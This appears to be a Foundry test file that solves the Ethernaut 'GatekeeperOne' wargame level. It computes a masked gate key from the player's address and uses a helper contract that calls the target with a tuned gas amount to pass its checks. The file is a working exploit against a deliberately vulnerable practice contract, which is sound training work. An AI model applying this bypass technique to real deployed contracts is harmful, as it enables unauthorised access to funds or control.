// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;
pragma experimental ABIEncoderV2;

import "../src/levels/GatekeeperOne.sol";
import "../src/levels/GatekeeperOneFactory.sol";
import "./utils/BaseTest.sol";
import "@openzeppelin/contracts/math/SafeMath.sol";

contract TestGatekeeperOne is BaseTest{
    using SafeMath for uint256;
    GatekeeperOne level;


    constructor() public{
        levelFactory = new GatekeeperOneFactory();
    }

    function setUp() public override{
        super.setUp();
    }
    function testRunLevel() public{
        runLevel();
    }
   function setupLevel() internal override{
        levelAddress = payable(this.createLevelInstance(true));
        level = GatekeeperOne(levelAddress);
                
        assertEq(level.entrant(), address(0));
    }

    function exploitLevel() internal override{
        bytes8 gateKey = bytes8(uint64(uint160(address(player)))) & 0xFFFFFFFF0000FFFF;
        Exploiter exploit = new Exploiter(level);
        vm.prank(player, player);
        exploit.exploit(gateKey);
        assertEq(level.entrant(), player);
    }
}

contract Exploiter is Test {
    GatekeeperOne victim;
    address private owner;
    constructor(GatekeeperOne _victim) public{
        victim = _victim;
        owner = msg.sender;
    }

    function exploit(bytes8 gateKey) public{
           victim.enter{gas: 802929}(gateKey);
}
}